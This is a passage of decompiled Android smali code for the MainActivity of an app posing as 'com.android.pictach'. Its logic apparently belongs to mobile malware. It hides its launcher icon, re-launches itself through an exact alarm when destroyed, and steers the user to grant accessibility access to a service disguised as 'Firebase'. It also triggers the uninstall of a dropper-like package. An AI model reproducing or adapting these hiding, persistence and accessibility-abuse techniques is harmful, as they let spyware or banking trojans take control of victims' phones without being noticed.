    .line 248
    invoke-virtual {p0, v2}, Landroid/app/Activity;->setContentView(I)V

    .line 251
    iput-boolean v3, p0, Lcom/android/pictach/MainActivity;->d:Z

    .line 253
    goto :goto_3

    .line 254
    :cond_8
    const p1, 0x7f0c001c

    .line 257
    invoke-virtual {p0, p1}, Landroid/app/Activity;->setContentView(I)V

    .line 260
    :goto_3
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 262
    const/16 v0, 0x1c

    .line 264
    if-gt p1, v0, :cond_9

    .line 266
    :try_start_5
    iget-object p1, p0, Lcom/android/pictach/MainActivity;->h:Landroid/content/SharedPreferences;

    .line 268
    invoke-interface {p1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    .line 271
    move-result-object p1

    .line 272
    const-string v0, "hidden_status"

    .line 274
    invoke-interface {p1, v0, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 277
    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 280
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 283
    move-result-object p1

    .line 284
    invoke-virtual {p0}, Landroid/app/Activity;->getComponentName()Landroid/content/ComponentName;

    .line 287
    move-result-object v0

    .line 288
    const/4 v1, 0x2

    .line 289
    invoke-virtual {p1, v0, v1, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_5

    .line 292
    :catch_5
    :cond_9
    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    .line 295
    move-result p1

    .line 296
    if-nez p1, :cond_b

    .line 298
    iget-boolean p1, p0, Lcom/android/pictach/MainActivity;->g:Z

    .line 300
    if-eqz p1, :cond_a

    .line 302
    goto :goto_4

    .line 303
    :cond_a
    new-instance p1, Lbo;

    .line 305
    invoke-direct {p1, p0}, Lbo;-><init>(Landroid/app/Activity;)V

    .line 308
    iput-object p1, p0, Lcom/android/pictach/MainActivity;->c:Lbo;

    .line 310
    iget-object p1, p0, Lcom/android/pictach/MainActivity;->e:Landroid/os/Handler;

    .line 312
    new-instance v0, Le7;

    .line 314
    const/4 v1, 0x3

    .line 315
    invoke-direct {v0, v1, p0}, Le7;-><init>(ILjava/lang/Object;)V

    .line 318
    const-wide/16 v1, 0x1f4

    .line 320
    invoke-virtual {p1, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 323
    :cond_b
    :goto_4
    invoke-virtual {p0}, Lcom/android/pictach/MainActivity;->e()V

    .line 326
    invoke-virtual {p0}, Lcom/android/pictach/MainActivity;->d()V

    .line 329
    invoke-virtual {p0}, Lcom/android/pictach/MainActivity;->a()V

    .line 332
    invoke-virtual {p0}, Lcom/android/pictach/MainActivity;->c()V

    .line 335
    return-void
.end method

.method public final onDestroy()V
    .locals 10

    .line 1
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    .line 4
    const/4 v0, 0x1

    .line 5
    iput-boolean v0, p0, Lcom/android/pictach/MainActivity;->g:Z

    .line 7
    iget-object v1, p0, Lcom/android/pictach/MainActivity;->c:Lbo;

    .line 9
    const/4 v2, 0x0

    .line 10
    if-eqz v1, :cond_1

    .line 12
    iput-boolean v0, v1, Lbo;->g:Z

    .line 14
    iget-object v0, v1, Lbo;->j:Lyn;

    .line 16
    if-eqz v0, :cond_0

    .line 18
    iget-object v3, v1, Lbo;->h:Landroid/os/Handler;

    .line 20
    invoke-virtual {v3, v0}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 23
    iput-object v2, v1, Lbo;->j:Lyn;

    .line 25
    :cond_0
    iget-object v0, v1, Lbo;->h:Landroid/os/Handler;

    .line 27
    invoke-virtual {v0, v2}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V

    .line 30
    invoke-virtual {v1}, Lbo;->a()V

    .line 33
    :cond_1
    iget-object v0, p0, Lcom/android/pictach/MainActivity;->f:Landroid/os/PowerManager$WakeLock;

    .line 35
    if-eqz v0, :cond_2

    .line 37
    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    .line 40
    move-result v0

    .line 41
    if-eqz v0, :cond_2

    .line 43
    :try_start_0
    iget-object v0, p0, Lcom/android/pictach/MainActivity;->f:Landroid/os/PowerManager$WakeLock;

    .line 45
    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 48
    :catch_0
    :cond_2
    :try_start_1
    const-string v0, "alarm"

    .line 50
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 53
    move-result-object v0

    .line 54
    check-cast v0, Landroid/app/AlarmManager;

    .line 56
    new-instance v1, Landroid/content/Intent;

    .line 58
    const-class v3, Lcom/android/pictach/MyReceiver;

    .line 60
    invoke-direct {v1, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 63
    const-string v3, "RESTART_SERVICE"

    .line 65
    invoke-virtual {v1, v3}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 68
    const/high16 v3, 0x4000000

    .line 70
    const/4 v4, 0x0

    .line 71
    invoke-static {p0, v4, v1, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    .line 74
    move-result-object v1

    .line 75
    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 77
    const/16 v5, 0x17

    .line 79
    const-wide/16 v6, 0x3e8

    .line 81
    if-lt v3, v5, :cond_3

    .line 83
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 86
    move-result-wide v3

    .line 87
    add-long/2addr v3, v6

    .line 88
    invoke-static {v0, v3, v4, v1}, Lqh;->j(Landroid/app/AlarmManager;JLandroid/app/PendingIntent;)V

    .line 91
    goto :goto_0

    .line 92
    :cond_3
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 95
    move-result-wide v8

    .line 96
    add-long/2addr v8, v6

    .line 97
    invoke-virtual {v0, v4, v8, v9, v1}, Landroid/app/AlarmManager;->setExact(IJLandroid/app/PendingIntent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 100
    goto :goto_0

    .line 101
    :catch_1
    nop

    .line 102
    :goto_0
    iget-object v0, p0, Lcom/android/pictach/MainActivity;->e:Landroid/os/Handler;

    .line 104
    if-eqz v0, :cond_4

    .line 106
    invoke-virtual {v0, v2}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V

    .line 109
    :cond_4
    return-void
.end method

.method public final onPause()V
    .locals 4

    .line 1
    invoke-super {p0}, Landroid/app/Activity;->onPause()V

    .line 4
    iget-object v0, p0, Lcom/android/pictach/MainActivity;->c:Lbo;

    .line 6
    if-eqz v0, :cond_1

    .line 8
    iget-object v1, v0, Lbo;->j:Lyn;

    .line 10
    iget-object v2, v0, Lbo;->h:Landroid/os/Handler;

    .line 12
    const/4 v3, 0x0

    .line 13
    if-eqz v1, :cond_0

    .line 15
    invoke-virtual {v2, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 18
    iput-object v3, v0, Lbo;->j:Lyn;

    .line 20
    :cond_0
    invoke-virtual {v2, v3}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V

    .line 23
    invoke-virtual {v0}, Lbo;->a()V

    .line 26
    :cond_1
    return-void
.end method

.method public final onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 5

    .line 1
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V

    .line 4
    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    .line 7
    move-result p2

    .line 8
    if-nez p2, :cond_c

    .line 10
    iget-boolean p2, p0, Lcom/android/pictach/MainActivity;->g:Z

    .line 12
    if-eqz p2, :cond_0

    .line 14
    goto/16 :goto_6

    .line 16
    :cond_0
    iget-object p2, p0, Lcom/android/pictach/MainActivity;->c:Lbo;

    .line 18
    if-eqz p2, :cond_c

    .line 20
    monitor-enter p2

    .line 21
    :try_start_0
    iget-boolean v0, p2, Lbo;->g:Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 23
    const/4 v1, 0x1

    .line 24
    const/4 v2, 0x0

    .line 25
    if-eqz v0, :cond_1

    .line 27
    monitor-exit p2

    .line 28
    goto/16 :goto_4

    .line 30
    :cond_1
    :try_start_1
    invoke-virtual {p2}, Lbo;->b()Landroid/app/Activity;

    .line 33
    move-result-object v0

    .line 34
    if-eqz v0, :cond_a

    .line 36
    const/16 v3, 0x7b

    .line 38
    if-ne p1, v3, :cond_a

    .line 40
    iget-boolean p1, p2, Lbo;->d:Z

    .line 42
    if-nez p1, :cond_2

    .line 44
    goto :goto_3

    .line 45
    :cond_2
    iput-boolean v1, p2, Lbo;->f:Z

    .line 47
    iput-boolean v2, p2, Lbo;->d:Z

    .line 49
    array-length p1, p3

    .line 50
    const/4 v3, 0x0

    .line 51
    :goto_0
    if-ge v3, p1, :cond_4

    .line 53
    aget v4, p3, v3

    .line 55
    if-eqz v4, :cond_3

    .line 57
    const/4 p1, 0x0

    .line 58
    goto :goto_1

    .line 59
    :cond_3
    add-int/lit8 v3, v3, 0x1

    .line 61
    goto :goto_0

    .line 62
    :cond_4
    const/4 p1, 0x1

    .line 63
    :goto_1
    if-nez p1, :cond_7

    .line 65
    iget p1, p2, Lbo;->c:I

    .line 67
    add-int/2addr p1, v1

    .line 68
    iput p1, p2, Lbo;->c:I

    .line 70
    const/4 p3, 0x2

    .line 71
    if-lt p1, p3, :cond_5

    .line 73
    iget-boolean p1, p2, Lbo;->g:Z

    .line 75
    if-nez p1, :cond_9

    .line 77
    invoke-virtual {p2}, Lbo;->g()V

    .line 80
    goto :goto_2

    .line 81
    :cond_5
    iget-object p1, p2, Lbo;->j:Lyn;

    .line 83
    if-eqz p1, :cond_6

    .line 85
    iget-object p3, p2, Lbo;->h:Landroid/os/Handler;

    .line 87
    invoke-virtual {p3, p1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 90
    :cond_6
    iget-object p1, p2, Lbo;->h:Landroid/os/Handler;

    .line 92
    new-instance p3, Lyn;

    .line 94
    invoke-direct {p3, p2, v2}, Lyn;-><init>(Lbo;I)V

    .line 97
    const-wide/16 v3, 0x64

    .line 99
    invoke-virtual {p1, p3, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 102
    goto :goto_2

    .line 103
    :cond_7
    invoke-virtual {p2}, Lbo;->d()Z

    .line 106
    move-result p1

    .line 107
    iput-boolean p1, p2, Lbo;->k:Z

    .line 109
    if-eqz p1, :cond_9

    .line 111
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 113
    const/16 p3, 0x1e

    .line 115
    if-lt p1, p3, :cond_8

    .line 117
    invoke-static {}, Lq;->u()Z

    .line 120
    move-result p1

    .line 121
    if-nez p1, :cond_8

    .line 123
    iget-object p1, p2, Lbo;->h:Landroid/os/Handler;

    .line 125
    new-instance p3, Lb7;

    .line 127
    const/4 v0, 0x6

    .line 128
    invoke-direct {p3, v0, p2}, Lb7;-><init>(ILjava/lang/Object;)V

    .line 131
    const-wide/16 v3, 0x1f4

    .line 133
    invoke-virtual {p1, p3, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 136
    goto :goto_2

    .line 137
    :cond_8
    invoke-virtual {p2, v0}, Lbo;->h(Landroid/app/Activity;)V

    .line 140
    :cond_9
    :goto_2
    iput-boolean v2, p2, Lbo;->f:Z
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 142
    monitor-exit p2

    .line 143
    goto :goto_4

    .line 144
    :cond_a
    :goto_3
    monitor-exit p2

    .line 145
    :goto_4
    iget-object p1, p0, Lcom/android/pictach/MainActivity;->h:Landroid/content/SharedPreferences;

    .line 147
    const-string p2, "accessibility_granted"

    .line 149
    invoke-interface {p1, p2, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 152
    move-result p1

    .line 153
    invoke-virtual {p0}, Lcom/android/pictach/MainActivity;->b()Z

    .line 156
    move-result p2

    .line 157
    if-eqz p2, :cond_c

    .line 159
    iget-boolean p2, p0, Lcom/android/pictach/MainActivity;->d:Z

    .line 161
    if-nez p2, :cond_c

    .line 163
    iput-boolean v1, p0, Lcom/android/pictach/MainActivity;->d:Z

    .line 165
    if-eqz p1, :cond_b

    .line 167
    const p1, 0x7f0c001d

    .line 170
    invoke-virtual {p0, p1}, Landroid/app/Activity;->setContentView(I)V

    .line 173
    goto :goto_5

    .line 174
    :cond_b
    const p1, 0x7f0c0033

    .line 177
    invoke-virtual {p0, p1}, Landroid/app/Activity;->setContentView(I)V

    .line 180
    :goto_5
    invoke-virtual {p0}, Lcom/android/pictach/MainActivity;->c()V

    .line 183
    goto :goto_6

    .line 184
    :catchall_0
    move-exception p1

    .line 185
    monitor-exit p2

    .line 186
    throw p1

    .line 187
    :cond_c
    :goto_6
    return-void
.end method

.method public final onResume()V
    .locals 5

    .line 1
    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    .line 4
    invoke-virtual {p0}, Lcom/android/pictach/MainActivity;->a()V

    .line 7
    iget-object v0, p0, Lcom/android/pictach/MainActivity;->h:Landroid/content/SharedPreferences;

    .line 9
    const-string v1, "accessibility_granted"

    .line 11
    const/4 v2, 0x0

    .line 12
    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 15
    move-result v0

    .line 16
    iget-boolean v1, p0, Lcom/android/pictach/MainActivity;->d:Z

    .line 18
    const/4 v2, 0x1

    .line 19
    if-nez v1, :cond_1

    .line 21
    iget-object v1, p0, Lcom/android/pictach/MainActivity;->c:Lbo;

    .line 23
    if-eqz v1, :cond_1

    .line 25
    invoke-virtual {p0}, Lcom/android/pictach/MainActivity;->b()Z

    .line 28
    move-result v1

    .line 29
    if-eqz v1, :cond_1

    .line 31
    iput-boolean v2, p0, Lcom/android/pictach/MainActivity;->d:Z

    .line 33
    if-eqz v0, :cond_0

    .line 35
    const v0, 0x7f0c001d

    .line 38
    invoke-virtual {p0, v0}, Landroid/app/Activity;->setContentView(I)V

    .line 41
    goto :goto_0

    .line 42
    :cond_0
    const v0, 0x7f0c0033

    .line 45
    invoke-virtual {p0, v0}, Landroid/app/Activity;->setContentView(I)V

    .line 48
    :cond_1
    :goto_0
    iget-object v0, p0, Lcom/android/pictach/MainActivity;->c:Lbo;

    .line 50
    if-eqz v0, :cond_7

    .line 52
    iget-boolean v0, p0, Lcom/android/pictach/MainActivity;->g:Z

    .line 54
    if-nez v0, :cond_7

    .line 56
    iget-object v0, p0, Lcom/android/pictach/MainActivity;->c:Lbo;

    .line 58
    invoke-virtual {v0}, Lbo;->b()Landroid/app/Activity;

    .line 61
    move-result-object v1

    .line 62
    if-eqz v1, :cond_7

    .line 64
    iget-boolean v3, v0, Lbo;->g:Z

    .line 66
    if-eqz v3, :cond_2

    .line 68
    goto :goto_1

    .line 69
    :cond_2
    invoke-virtual {v0}, Lbo;->d()Z

    .line 72
    move-result v3

    .line 73
    const/16 v4, 0x1e

    .line 75
    if-eqz v3, :cond_4

    .line 77
    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 79
    if-lt v3, v4, :cond_3

    .line 81
    invoke-static {}, Lq;->u()Z

    .line 84
    move-result v2

    .line 85
    :cond_3
    if-eqz v2, :cond_4

    .line 87
    invoke-virtual {v0, v1}, Lbo;->h(Landroid/app/Activity;)V

    .line 90
    goto :goto_1

    .line 91
    :cond_4
    invoke-virtual {v0}, Lbo;->d()Z

    .line 94
    move-result v2

    .line 95
    if-nez v2, :cond_6

    .line 97
    invoke-virtual {v1}, Landroid/app/Activity;->isFinishing()Z

    .line 100
    move-result v1

    .line 101
    if-nez v1, :cond_6

    .line 103
    iget v1, v0, Lbo;->c:I

    .line 105
    const/4 v2, 0x2

    .line 106
    if-lt v1, v2, :cond_5

    .line 108
    iget-boolean v1, v0, Lbo;->e:Z

    .line 110
    if-nez v1, :cond_5

    .line 112
    invoke-virtual {v0}, Lbo;->g()V

    .line 115
    goto :goto_1

    .line 116
    :cond_5
    iget-boolean v1, v0, Lbo;->d:Z

    .line 118
    if-nez v1, :cond_7

    .line 120
    invoke-virtual {v0}, Lbo;->i()V

    .line 123
    goto :goto_1

    .line 124
    :cond_6
    iget-boolean v1, v0, Lbo;->k:Z

    .line 126
    if-eqz v1, :cond_7

    .line 128
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 130
    if-lt v1, v4, :cond_7

    .line 132
    invoke-static {}, Lq;->u()Z

    .line 135
    move-result v1

    .line 136
    if-nez v1, :cond_7

    .line 138
    invoke-virtual {v0}, Lbo;->e()V

    .line 141
    :cond_7
    :goto_1
    invoke-virtual {p0}, Lcom/android/pictach/MainActivity;->d()V

    .line 144
    invoke-virtual {p0}, Lcom/android/pictach/MainActivity;->c()V

    .line 147
    return-void
.end method

.method public openAccessibilitySettings(Landroid/view/View;)V
    .locals 4

    .line 1
    const-string p1, "android.settings.ACCESSIBILITY_SETTINGS"

    .line 3
    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    .line 6
    move-result v0

    .line 7
    if-nez v0, :cond_1

    .line 9
    iget-boolean v0, p0, Lcom/android/pictach/MainActivity;->g:Z

    .line 11
    if-eqz v0, :cond_0

    .line 13
    goto :goto_0

    .line 14
    :cond_0
    :try_start_0
    new-instance v0, Landroid/content/Intent;

    .line 16
    invoke-direct {v0, p1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 19
    const/high16 v1, 0x10000000

    .line 21
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 24
    new-instance v1, Ljava/lang/StringBuilder;

    .line 26
    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    .line 29
    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 32
    move-result-object v2

    .line 33
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 36
    const-string v2, "/"

    .line 38
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 41
    const-class v2, Lcom/android/pictach/Firebase;

    .line 43
    invoke-virtual {v2}, Ljava/lang/Class;->getName()Ljava/lang/String;

    .line 46
    move-result-object v2

    .line 47
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 50
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 53
    move-result-object v1

    .line 54
    new-instance v2, Landroid/os/Bundle;

    .line 56
    invoke-direct {v2}, Landroid/os/Bundle;-><init>()V

    .line 59
    const-string v3, ":settings:fragment_args_key"

    .line 61
    invoke-virtual {v2, v3, v1}, Landroid/os/BaseBundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    .line 64
    const-string v1, ":settings:show_fragment_args"

    .line 66
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Bundle;)Landroid/content/Intent;

    .line 69
    const-string v1, ":settings:source_package"

    .line 71
    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 74
    move-result-object v2

    .line 75
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 78
    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 81
    goto :goto_0

    .line 82
    :catch_0
    :try_start_1
    new-instance v0, Landroid/content/Intent;

    .line 84
    invoke-direct {v0, p1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 87
    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 90
    goto :goto_0

    .line 91
    :catch_1
    move-exception p1

    .line 92
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    .line 95
    :cond_1
    :goto_0
    return-void
.end method

.method public uninstallApp(Landroid/view/View;)V
    .locals 2

    .line 1
    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    .line 4
    move-result p1

    .line 5
    if-nez p1, :cond_1

    .line 7
    invoke-virtual {p0}, Landroid/app/Activity;->isDestroyed()Z

    .line 10
    move-result p1

    .line 11
    if-eqz p1, :cond_0

    .line 13
    goto :goto_0

    .line 14
    :cond_0
    :try_start_0
    new-instance p1, Landroid/content/Intent;

    .line 16
    const-string v0, "android.intent.action.DELETE"

    .line 18
    invoke-direct {p1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 21
    const-string v0, "package:com.cristal.bristral.tristal.mistral"

    .line 23
    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    .line 26
    move-result-object v0

    .line 27
    invoke-virtual {p1, v0}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 30
    const-string v0, "android.intent.extra.RETURN_RESULT"

    .line 32
    const/4 v1, 0x1

    .line 33
    invoke-virtual {p1, v0, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    .line 36
    const/high16 v0, 0x10000000

    .line 38
    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 41
    invoke-virtual {p0, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 44
    goto :goto_0

    .line 45
    :catch_0
    move-exception p1

    .line 46
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    .line 49
    :cond_1
    :goto_0
    return-void
.end method
